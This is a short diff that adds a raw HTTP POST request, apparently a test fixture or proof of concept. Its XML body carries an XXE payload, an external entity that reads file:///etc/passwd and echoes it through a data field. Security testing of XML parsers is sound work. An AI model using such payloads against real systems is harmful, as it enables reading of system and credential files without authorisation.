@@ -1,0 +1,7 @@
+POST /api/xml HTTP/1.1
+Host: localhost
+Content-Type: application/xml
+Content-Length: 150
+
+<!DOCTYPE foo [ <!ENTITY xxe SYSTEM "file:///etc/passwd"> ]>
+<root><data>&xxe;</data></root>
